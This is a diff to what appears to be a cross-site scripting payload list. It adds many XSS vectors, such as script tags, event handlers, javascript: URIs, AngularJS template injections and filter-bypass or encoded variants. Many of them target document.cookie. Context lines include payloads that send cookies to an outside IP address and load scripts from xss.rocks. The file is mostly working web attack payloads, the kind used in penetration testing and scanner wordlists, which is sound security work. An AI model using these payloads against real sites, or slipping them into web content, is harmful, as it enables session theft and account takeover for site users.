@@ -2,15 +2,33 @@
 <Script>alert(1)</Script>
 <sCript>alert(document.domain)</sCript>
 <script>alert(123);</script>
-<script>alert("Armour");</script>
+<script>alert("test");</script>
+<script>alert(document.cookie)</script>
+</script><script>alert(document.cookie)</script>
+javascript:alert(document.cookie)
+javascript:prompt(document.cookie)
+'-alert(document.cookie)-'
+</script><svg onload=alert(document.cookie)>
+"onmouseover=alert(document.cookie)//
+{{$on.constructor('alert(1)')()}}
+<Script>alert(document.cookie)</Script>
+<sCript>alert(document.domain)</sCript>
+<script>alert(document.cookie);</script>
+<script>alert(document.cookie);</script>
 <script>alert(document.domain)</script>
 <script>alert(document.cookie)</script>
 <script>new Image().src="http://192.168.1.6/?c="+document.cookie;</script>
 <script>var i=new Image; i.src="http://192.168.1.6/?"+document.cookie;</script>
+</script><script>alert(1)</script>
 <img src="abc" onerror="alert(1)">
 <img src="" onerror="alert(document.cookie)">
 <img src='x' onerror='alert(document.cookie)' />
+&lt;img src=0 onerror=alert(&#39;1&#39;)&gt;
+&lt;img src=0 onerror=alert(document.cookie)&gt;
 <svg/onload=alert(1)>
+"><svg onload=alert(1)>
+';alert('1');'
+';alert('abc');'
 <sc<script>ript>alert(1)</sc</script>ript>
 <BODY ONLOAD=alert('1')>
 <marquee onstart=alert(1)></marquee>
@@ -30,6 +48,7 @@
 "<img src='x' onerror='alert(10)' />"
 https://brutelogic.com.br/poc.svg
 http://xss.rocks/scriptlet.html
+javascript:alert(document.cookie)
 poc.svg = <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
 <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
 <IMG SRC="javascript:alert('XSS');">
@@ -48,3 +67,11 @@ poc.svg = <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)
 <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
 <IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
 <OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
+<script>'-alert(1)-'</script>
+'-alert(1)-'
+></select><img%20src=1%20onerror=alert(1)>
+{{$on.constructor('alert(1)')()}}
+\"-alert(1)}//
+<img src=1 onerror=print()>
+"-top['al\x65rt']('sailay')-" 
+<pre id=p style=background:#000><svg onload='setInterval(n=>{for(o=t++,i=476;i--;o+=i%30?("0o"[c=0|(h=v=>(M=Math).hypot(i/30-8+3*M.sin(t/8/v),i%30/2-7+4*M.cos(t/9/v)))(7)*h(9)*h(6)/32]||".").fontcolor(c>2):"\n");p.innerHTML=o},t=1)'>
